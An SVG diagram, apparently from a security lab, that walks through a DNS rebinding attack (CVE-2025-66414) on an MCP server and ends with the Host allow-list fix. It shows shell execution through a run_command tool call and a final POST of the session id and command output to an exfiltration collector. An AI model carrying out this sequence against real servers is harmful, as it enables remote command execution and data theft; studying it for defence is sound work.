<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 980 760" width="980" height="760" font-family="ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif" role="img" aria-label="CVE-2025-66414 DNS rebinding attack sequence across the attacker page, the attacker's authoritative DNS, the victim MCP transport, run_command and the collector">
  <title>CVE-2025-66414 - DNS rebinding attack sequence</title>

  <rect x="0" y="0" width="980" height="760" rx="16" fill="#f6f8fa"/>
  <rect x="0.5" y="0.5" width="979" height="759" rx="16" fill="none" stroke="#d0d7de"/>

  <defs>
    <marker id="s" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
      <path d="M0,0 L10,5 L0,10 z" fill="#cf222e"/>
    </marker>
    <marker id="d" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
      <path d="M0,0 L10,5 L0,10 z" fill="#6e7781"/>
    </marker>
  </defs>

  <text x="30" y="46" font-size="20" font-weight="700" fill="#1f2328">Attack sequence - the DNS answer changes, the URL does not</text>
  <text x="30" y="70" font-size="12.5" fill="#57606a">CVE-2025-66414 . one hostname, two addresses over time . every request below is same-origin, so its Origin matches its Host</text>

  <!-- ===== lifelines ===== -->
  <rect x="28" y="92" width="176" height="46" rx="9" fill="#fff5f5" stroke="#cf222e" stroke-width="1.3"/>
  <text x="116" y="112" font-size="12" font-weight="700" fill="#1f2328" text-anchor="middle">attacker page</text>
  <text x="116" y="129" font-size="9.5" fill="#57606a" text-anchor="middle">rebind.lab.consulereit.nl:8080</text>
  <line x1="116" y1="138" x2="116" y2="640" stroke="#cf222e" stroke-width="1" stroke-dasharray="4 4"/>

  <rect x="236" y="92" width="176" height="46" rx="9" fill="#fff5f5" stroke="#cf222e" stroke-width="1.3"/>
  <text x="324" y="112" font-size="12" font-weight="700" fill="#1f2328" text-anchor="middle">attacker DNS</text>
  <text x="324" y="129" font-size="9.5" fill="#57606a" text-anchor="middle">authoritative, TTL 1 to 5 s</text>
  <line x1="324" y1="138" x2="324" y2="640" stroke="#cf222e" stroke-width="1" stroke-dasharray="4 4"/>

  <rect x="444" y="92" width="200" height="46" rx="9" fill="#fff5f5" stroke="#cf222e" stroke-width="1.3"/>
  <text x="544" y="112" font-size="12" font-weight="700" fill="#1f2328" text-anchor="middle">MCP transport</text>
  <text x="544" y="129" font-size="9.5" fill="#57606a" text-anchor="middle">buildbot-mcp . SDK ^1.12.0</text>
  <line x1="544" y1="138" x2="544" y2="640" stroke="#cf222e" stroke-width="1" stroke-dasharray="4 4"/>

  <rect x="676" y="92" width="140" height="46" rx="9" fill="#ffffff" stroke="#d0d7de"/>
  <text x="746" y="112" font-size="12" font-weight="700" fill="#1f2328" text-anchor="middle">run_command</text>
  <text x="746" y="129" font-size="9.5" fill="#57606a" text-anchor="middle">/bin/sh -c ...</text>
  <line x1="746" y1="138" x2="746" y2="640" stroke="#6e7781" stroke-width="1" stroke-dasharray="4 4"/>

  <rect x="848" y="92" width="104" height="46" rx="9" fill="#ffffff" stroke="#d0d7de"/>
  <text x="900" y="112" font-size="12" font-weight="700" fill="#1f2328" text-anchor="middle">collector</text>
  <text x="900" y="129" font-size="9.5" fill="#57606a" text-anchor="middle">exfil sink</text>
  <line x1="900" y1="138" x2="900" y2="640" stroke="#6e7781" stroke-width="1" stroke-dasharray="4 4"/>

  <!-- ===== phase 1: before the flip ===== -->
  <rect x="28" y="152" width="924" height="20" rx="6" fill="#eef2ff"/>
  <text x="40" y="166" font-size="10.5" font-weight="700" fill="#6639ba">PHASE 1 . before the flip - the name resolves to the attacker, and nothing has touched the victim yet</text>

  <line x1="116" y1="192" x2="322" y2="192" stroke="#cf222e" stroke-width="1.8" marker-end="url(#s)"/>
  <text x="128" y="187" font-size="10.5" font-weight="700" fill="#cf222e">1 A? rebind.lab.consulereit.nl</text>
  <line x1="322" y1="216" x2="118" y2="216" stroke="#cf222e" stroke-width="1.5" stroke-dasharray="6 4" marker-end="url(#s)"/>
  <text x="200" y="211" font-size="10.5" font-weight="700" fill="#cf222e" text-anchor="start">2 answer: attacker address, TTL 1 s</text>

  <line x1="116" y1="248" x2="116" y2="248" stroke="#cf222e" stroke-width="1.5"/>
  <rect x="128" y="234" width="384" height="34" rx="7" fill="#ffffff" stroke="#d0d7de"/>
  <text x="140" y="248" font-size="10" fill="#1f2328" font-weight="600">3 the victim loads the page and it starts polling its own origin</text>
  <text x="140" y="261" font-size="9.5" fill="#57606a">fetch("/mcp") is same-origin: Origin equals Host, so no CORS check applies</text>

  <!-- ===== the flip ===== -->
  <rect x="28" y="286" width="924" height="42" rx="8" fill="#fff5f5" stroke="#cf222e" stroke-width="1.4"/>
  <text x="40" y="303" font-size="11" font-weight="700" fill="#cf222e">4 THE FLIP . the attacker repoints the same A record at the victim's address and waits one TTL</text>
  <text x="40" y="320" font-size="9.5" fill="#57606a">Nothing changes in the browser: same scheme, same host, same port, same tab. Only the answer behind the name is different.</text>

  <!-- ===== phase 2: after the flip ===== -->
  <rect x="28" y="342" width="924" height="20" rx="6" fill="#eef2ff"/>
  <text x="40" y="356" font-size="10.5" font-weight="700" fill="#6639ba">PHASE 2 . after the flip - the same page, the same URL, now talking to the victim MCP</text>

  <line x1="116" y1="382" x2="322" y2="382" stroke="#cf222e" stroke-width="1.8" marker-end="url(#s)"/>
  <text x="128" y="377" font-size="10.5" font-weight="700" fill="#cf222e">5 A? rebind.lab.consulereit.nl (TTL expired)</text>
  <line x1="322" y1="406" x2="118" y2="406" stroke="#cf222e" stroke-width="1.5" stroke-dasharray="6 4" marker-end="url(#s)"/>
  <text x="152" y="401" font-size="10.5" font-weight="700" fill="#cf222e">6 answer: the victim's address</text>

  <line x1="116" y1="438" x2="542" y2="438" stroke="#cf222e" stroke-width="1.8" marker-end="url(#s)"/>
  <text x="128" y="433" font-size="10.5" font-weight="700" fill="#cf222e">7 POST /mcp {initialize}   Host: rebind.lab.consulereit.nl   Origin: the same</text>
  <text x="128" y="452" font-size="9.5" fill="#57606a">the browser thinks this is its own origin, so it sends the request without hesitation</text>

  <rect x="537" y="428" width="14" height="176" rx="3" fill="#ffe3e3" stroke="#cf222e"/>

  <line x1="537" y1="480" x2="120" y2="480" stroke="#cf222e" stroke-width="1.5" stroke-dasharray="6 4" marker-end="url(#s)"/>
  <text x="150" y="475" font-size="10.5" font-weight="700" fill="#cf222e">8 200  mcp-session-id: (a session minted for the foreign Host)</text>
  <text x="150" y="494" font-size="9.5" fill="#57606a">the Host is a name this server does not serve, and it is never checked</text>

  <line x1="116" y1="524" x2="542" y2="524" stroke="#cf222e" stroke-width="1.8" marker-end="url(#s)"/>
  <text x="128" y="519" font-size="10.5" font-weight="700" fill="#cf222e">9 POST /mcp {tools/call run_command, cmd: canary}</text>

  <line x1="551" y1="552" x2="744" y2="552" stroke="#6e7781" stroke-width="1.6" marker-end="url(#d)"/>
  <text x="558" y="547" font-size="9.5" font-weight="600" fill="#1f2328">10 exec /bin/sh -c (benign canary)</text>
  <rect x="740" y="542" width="12" height="40" rx="3" fill="#eaeef2" stroke="#6e7781"/>
  <line x1="740" y1="582" x2="553" y2="582" stroke="#6e7781" stroke-width="1.4" stroke-dasharray="6 4" marker-end="url(#d)"/>
  <text x="600" y="577" font-size="9.5" fill="#57606a">11 uid=0(root), container id, LAB_CANARY_&lt;pid&gt;</text>

  <line x1="537" y1="612" x2="120" y2="612" stroke="#cf222e" stroke-width="1.5" stroke-dasharray="6 4" marker-end="url(#s)"/>
  <text x="150" y="607" font-size="10.5" font-weight="700" fill="#cf222e">12 200  tools/call result carrying the canary output</text>

  <line x1="116" y1="640" x2="896" y2="640" stroke="#cf222e" stroke-width="1.8" marker-end="url(#s)"/>
  <text x="128" y="635" font-size="10.5" font-weight="700" fill="#cf222e">13 POST /pwned {host, session id, canary output}</text>

  <!-- ===== footer ===== -->
  <rect x="28" y="664" width="924" height="72" rx="10" fill="#ffffff" stroke="#d0d7de"/>
  <text x="46" y="686" font-size="10.5" font-weight="700" fill="#6639ba">Step 7 is the whole attack: a request the browser considers same-origin, carrying a Host the server does not serve.</text>
  <text x="46" y="704" font-size="10" fill="#57606a">Module 01's control (is this Origin foreign?) cannot see it: the Origin is the page's own. Turning on the Host allow-list</text>
  <text x="46" y="720" font-size="10" fill="#57606a">refuses step 7 with 403 before a session exists, and steps 8 to 13 never happen. Isolated lab VMs . benign canary only.</text>
</svg>
